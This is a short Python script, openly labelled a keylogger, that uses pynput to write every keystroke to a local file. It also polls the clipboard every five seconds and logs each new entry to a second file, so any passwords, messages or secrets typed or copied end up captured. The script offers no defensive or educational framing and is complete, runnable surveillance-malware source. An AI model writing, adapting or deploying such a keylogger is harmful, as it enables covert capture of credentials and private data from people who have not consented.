from pynput import keyboard
import pyperclip
import threading
import time

# Define log files
keystroke_log = "keystrokes.txt"
clipboard_log = "clipboard_data.txt"

# Function to log keystrokes
def log_keystrokes(key):
    try:
        with open(keystroke_log, "a") as klog:
            klog.write(f"{key.char}")
    except AttributeError:
        if key == keyboard.Key.space:
            with open(keystroke_log, "a") as klog:
                klog.write(" ")
        else:
            with open(keystroke_log, "a") as klog:
                klog.write(f"{str(key)}")

def release_key(key):
    if key == keyboard.Key.esc:
        return False

# Function to monitor clipboard content
def monitor_clipboard():
    previous_content = ""
    while True:
        try:
            current_content = pyperclip.paste()
            if current_content != previous_content:
                previous_content = current_content
                with open(clipboard_log, "a") as clog:
                    clog.write(f"Clipboard: {current_content}\n")
        except pyperclip.PyperclipException:
            pass
        time.sleep(5)

# Function to start keystroke logging
def start_keystroke_logging():
    # Append a new line to the keystroke log to separate sessions
    with open(keystroke_log, "a") as klog:
        klog.write("\n--- New Session ---\n")
    
    with keyboard.Listener(on_press=log_keystrokes, on_release=release_key) as listener:
        listener.join()

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keystroke_logging)
keylogger_thread.start()

# Start clipboard monitoring
monitor_clipboard()
